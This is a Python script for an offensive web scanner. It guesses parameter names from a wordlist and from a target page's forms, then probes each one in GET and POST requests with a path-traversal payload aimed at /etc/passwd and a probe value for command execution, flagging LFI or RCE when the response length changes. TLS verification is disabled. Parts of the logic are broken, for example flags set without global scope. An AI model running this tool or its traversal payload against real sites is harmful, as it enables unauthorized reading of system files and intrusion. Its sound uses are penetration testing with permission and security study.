#!/usr/bin/env python3

import argparse
import sys
import requests
import re
from cores.colors import green, white, end, info, bad, good, run, yellow, bold
from cores.utils import get_random_string,decode,encode

parser = argparse.ArgumentParser()
parser.add_argument('-u',help='target url', dest='url')
parser.add_argument('-w',help='wordlist path', dest='wordlist', default='./db/params.txt')
parser.add_argument('-b','--cookie',help='cookie', dest='cookie')
args = parser.parse_args()

url = args.url
wordlist = args.wordlist
cookie = args.cookie

args = parser.parse_args(args=None if sys.argv[1:] else ['--help'])

if cookie:
    headers = {     
                'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0',
                'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language' : 'en-US,en;q=0.5',
                'Accept-Encoding' : 'gzip, deflate',
                'Connection' : 'keep-alive',
                'Upgrade-Insecure-Requests' : '1',
                'Cookie':cookie,
                }
else:
    headers = {
                    'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0',
                    'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language' : 'en-US,en;q=0.5',
                    'Accept-Encoding' : 'gzip, deflate',
                    'Connection' : 'keep-alive',
                    'Upgrade-Insecure-Requests' : '1',
                }

paramList = []
try:
    with open(wordlist, 'r', encoding="utf8") as file:
        for line in file:
            paramList.append(line.strip('\n'))
except FileNotFoundError:
    print('%s The file doesn\'t exist' % bad)
    quit()

def requester(url, method, data, headers):
    if method == "GET":
        response = requests.get(url, params=data, headers=headers ,verify=False)
    elif method == "POST":
        response = requests.post(url, data=data, headers=headers, verify=False)
    return response

def parse(response):
    forms = re.findall(r'(?i)(?s)<form.*?</form.*?>', response)
    for form in forms:
        if "input" in form.strip():
            names = re.findall(r"name=['\"](.*?)['\"]", form.strip())
            print("%s Found possible parameters by parsing webpage: " % good,end="")
            for name in names:
                if name not in paramList:
                    paramList.append(name)
                print("%s %s" % (green,name), end=",")
        else:
            print("%s No parameters found in webpage:" % bad)


def checkParams(response, url, headers):
    values = ['../../../../../../../../etc/passwd', 'w']
    originalLength = len(response.text)
    # check for GET method
    print("\n%s Checking for GET request..." % good)
    for param in paramList:
        for value in values:
            data = {param:value}
            response = requester(url=url, method='GET', data=data, headers=headers)
            if len(response.text) != originalLength:
                if value == 'w':
                    print("%sFound valid param: %s %s%s(RCE!)"  % (green,param,bold,yellow))
                    RCE = True
                else:
                    print("%sFound valid param: %s"  % (green,param))
                    foundParams.insert(0, param)
                    LFI = True
    
    # check for POST method
    print("%s Checking for POST request..." % good)
    for param in paramList:
        for value in values:
            data = {param:value}
            response = requester(url=url, method='POST', data=data, headers=headers)
            if len(response.text) != originalLength:
                if value == 'w':
                    print("%sFound valid param: %s %s%s(RCE!)"  % (green,param,bold,yellow))
                    RCE = True
                else:
                    print("%sFound valid param: %s"  % (green,param))
                    foundParams.insert(0, param)
                    LFI = True
    return foundParams

if __name__ == "__main__":
    foundParams = []
    finalResult = []
    RCE = False
    LFI = False
    try:
        if url:
            try:
                originalFuzz = get_random_string(6)
                data = {originalFuzz:originalFuzz}
                response = requester(url=url, method='GET', data=data, headers=headers)
                # parse_webpage
                print("%s Parsing webpage for potential parameters..." % good)
                parse(response.text)
                # lfi and rce checking
                foundParams = checkParams(response, url, headers)
                if not foundParams:
                    print("%s No parameter found, trying bypassing techniques..." % info)
            except ConnectionError:
                print("Unable to connect to the target URL")
                quit()
    except KeyboardInterrupt:
        print("\n%s Exiting..." % bad)
        quit()